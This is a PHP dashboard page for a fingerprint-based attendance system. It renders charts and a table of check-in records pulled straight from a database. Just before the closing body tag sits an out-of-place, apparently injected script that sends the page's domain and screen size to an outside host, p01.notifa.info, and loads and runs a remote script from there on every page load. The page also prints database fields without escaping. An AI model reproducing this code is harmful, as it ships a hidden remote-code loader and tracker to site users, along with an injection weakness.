<?php 
include('connectDB.php');
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>Absen</title>
  <!-- base:css -->
  <link rel="stylesheet" href="vendors/mdi/css/materialdesignicons.min.css">
  <link rel="stylesheet" href="vendors/css/vendor.bundle.base.css">
  <!-- endinject -->
  <!-- plugin css for this page -->
  <!-- End plugin css for this page -->
  <!-- Data Table CSS Bs4 -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.css">
  <link rel="stylesheet" href="https://cdn.datatables.net/1.10.21/css/dataTables.bootstrap4.min.css">
  <!-- END Data Table CSS Bs4 -->
  <!-- inject:css -->
  <link rel="stylesheet" href="css/style.css">
  <link rel="stylesheet" href="css/Custom.css">
  <!-- endinject -->
  <link rel="shortcut icon" href="images/favicon.png" />
</head>
<body>
  <div class="container-scroller d-flex">

    <!-- partial:./partials/_sidebar.html -->
    <?php include('./partials/_sidebar.html'); ?>
    <!-- partial -->
    
    <div class="container-fluid page-body-wrapper">
      
      <!-- partial:./partials/_navbar.html -->
      <?php include('./partials/_navbar.html'); ?>
      <!-- partial -->

      <div class="main-panel">
        <div class="content-wrapper">
          <div class="row">
            <div class="col-12 col-xl-6 grid-margin stretch-card">
              <div class="row w-100 flex-grow">
                <div class="col-md-6 stretch-card">
                  <div class="card">
                    <div class="card-body">
                      <div class="d-flex align-items-center justify-content-between flex-wrap">
                        <p class="card-title">Grafik garis</p>
                      </div>
                      <div class="d-flex align-items-center flex-wrap mb-3">
                        <h5 class="font-weight-normal mb-0 mb-md-1 mb-lg-0 mr-3">Nilai Data</h5>
                        <p class="text-muted mb-0">Keterangan</p>
                      </div>
                      <canvas id="balance-chart" height="130"></canvas>
                    </div>
                  </div>
                </div>
                <div class="col-md-6 stretch-card">
                  <div class="card">
                    <div class="card-body">
                      <div class="d-flex align-items-center justify-content-between flex-wrap">
                        <p class="card-title">grafik batang</p>
                      </div>
                      <div class="d-flex align-items-center flex-wrap mb-3">
                        <h5 class="font-weight-normal mb-0 mb-md-1 mb-lg-0 mr-3">Nilai Data</h5>
                        <p class="text-muted mb-0">Keterangan</p>
                      </div>
                      <canvas id="audience-chart" height="130"></canvas>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="col-12 col-xl-6 grid-margin stretch-card">
              <div class="row w-100 flex-grow">
                <div class="col-md-12 stretch-card">
                  <div class="card">
                    <div class="card-body pb-0">
                      <p class="card-title">Statistik Absensi</p>
                    </div>
                    <canvas id="pieChart" height="250"></canvas>
                  </br>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="row">
            <div class="col-lg-12 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <h4 class="card-title">Absensi Terkini</h4>
                  <div class="table-responsive">
                    <table id="tampilData" class="table table-striped table-hover" style="width:100%">
                      <thead>
                          <tr>
                              <th>ID</th>
                              <th>Nama</th>
                              <th>Nomor Seri</th>
                              <th>Fingerprint ID</th>
                              <th>Date</th>
                              <th>Waktu Masuk</th>
                              <th>Waktu Keluar</th>
                          </tr>
                      </thead>
                      <tbody>
                          <?php
                          $cari = ("select * from users_logs order by checkindate asc");
                          $hasil = $conn -> query($cari);
                          while ($row = $hasil -> fetch_assoc())
                              {
                                ?>
                                <tr>
                                  <td><?php echo $row['id']; ?></td>
                                  <td><?php echo $row['username'];?></td>
                                  <td><?php echo $row['serialnumber'];?></td>
                                  <td><?php echo $row['fingerprint_id'];?></td>
                                  <td><?php echo $row['checkindate'];?></td>
                                  <td><?php echo $row['timein'];?></td>
                                  <td><?php echo $row['timeout'];?></td>
                                </tr>
                                <?php
                              }
                          ?>
                      </tbody>
                      <tfoot>
                          <tr>
                              <th>ID</th>
                              <th>Nama</th>
                              <th>Nomor Seri</th>
                              <th>Fingerprint ID</th>
                              <th>Date</th>
                              <th>Waktu Masuk</th>
                              <th>Waktu Keluar</th>
                          </tr>
                      </tfoot>
                  </table>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Button untuk alerts -->
          <div class="row">
            <div class="col-12 grid-margin">
              <div class="card">
                <div class="row">
                  <div class="col-md-4 col-sm-6 d-flex justify-content-center">
                    <div class="card-body">
                      <div class="wrapper text-center">
                        <h4 class="card-title">Buat Notif Berhasil Absen</h4>
                        <p class="card-description">Pake ini buat Absensi Nanti!</p>
                        <button class="btn btn-outline-success" onclick="showSwal('auto-close')">Click here!</button>
                      </div>
                    </div>  
                  </div>
                </div>
              </div>
            </div>
          </div>
          


        </div>
        <!-- content-wrapper ends -->
        <!-- partial:./partials/_footer.html -->
        <?php include('./partials/_footer.html'); ?>
        <!-- partial -->
      </div>
      <!-- main-panel ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->

  <!-- base:js -->
  <script src="vendors/js/vendor.bundle.base.js"></script>
  <!-- endinject -->
  <!-- Plugin js for this page-->
  <script src="vendors/chart.js/Chart.min.js"></script>
  <script src="js/chart.js"></script>
  <script src="vendors/js/sweetalert.min.js"></script>
  <!-- End plugin js for this page-->
  <!-- inject:js -->
  <script src="js/off-canvas.js"></script>
  <script src="js/hoverable-collapse.js"></script>
  <script src="js/template.js"></script>
  <!-- endinject -->
  <!-- plugin js for this page -->
  <!-- End plugin js for this page -->
  
  <!-- Custom js for this page-->
  <script src="js/dashboard.js"></script>
  <script src="js/Custom.js"></script>
  <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
  <script src="https://cdn.datatables.net/1.10.21/js/jquery.dataTables.min.js"></script>
  <script src="https://cdn.datatables.net/1.10.21/js/dataTables.bootstrap4.min.js"></script>
  
  <!-- Custom js alert for this page-->
  <script src="js/alerts.js"></script>
  <!-- End custom js alert for this page-->

  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXksvD9PC1rjlHEl68z%2fdDOJKQPUlZC4E73tgWZj7Llt4N8V9ZG3Z%2fhg2VKHnLbIW4HQbc%2bglYCXAAFaRnjwAOwtj5LHsBD1mSXZ7JKMERItp4ZdC%2fYSw94%2f5ZhzPzponHMjybYXCq3Y2av5MwTA5pWXxBtGTbcAj%2fdTYfHQYIfvjQt7SN9Ps6Vs9fC3Q2hzZHl5RJ4laYrnImwolLWqEk5utYM3GCeyBJgxtFQMUo%2bo4VQkDEpByp3BlRZjwp1CcrL87k93jFYPTqycy5ZWNGyVzFCFNqdQWz07g7rvIk%2fPhbSwiUJS1Qsfz3m7cqwO5W1BKnPp0gHL1Q%2fadJmrjWssB4PH1uTnzCFVahPrgfSRpfp4etnXtwD583lUQKuVmQEntnxL3H3d5%2fw0vyAvbr3FeU54siKyQP3TGGXByDaFyPUf%2fz6DiSvdaWPSjekv%2f0LNUnOlYCAyiJvdllB%2feH03bUwuAdpLShTRQZpiIfGecLV9xOy393rECsdh9C09sH%2bkww1Plj3WiJig9XgTSttm4W9jwA1w4LiPU9MyOZ1M8EOzhw49v7nhpCAPdOZ7PBoLXfrjndNAHFxUmp%2flHA1ZUlhvPEbwQpikXoWERdFqJ6tM9c%2bsLj6bAZpoX7A1uK" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
  
  
  <script>
  $(document).ready(function() {
      $('#tampilData').dataTable( {
          colReorder: {
              realtime: false
          }
      } );
  } );
  </script>
  <!-- End custom js for this page-->
</body>

</html>